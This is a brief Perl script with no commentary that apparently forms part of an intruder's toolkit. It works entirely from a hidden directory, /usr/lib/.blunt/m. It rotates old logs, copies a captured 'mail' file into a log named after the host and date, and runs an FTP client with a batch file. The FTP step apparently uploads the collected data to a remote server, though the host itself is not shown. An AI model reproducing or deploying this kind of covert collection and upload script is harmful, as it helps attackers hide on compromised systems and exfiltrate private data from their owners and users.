#!/usr/bin/perl

$s = "\n";
$h = `/bin/uname -n`;
$d = `/bin/date +%A-%j`;

$all = join($s, $h, $d);
@all = split(/$s/, $all);

system("mv /usr/lib/.blunt/m/*.log /usr/lib/.blunt/m/old");
system("cp /usr/lib/.blunt/m/mail /usr/lib/.blunt/m/$all[0]-$all[2].log");
system("/usr/lib/.blunt/m/quftp -s /usr/lib/.blunt/m/.go");

exit;
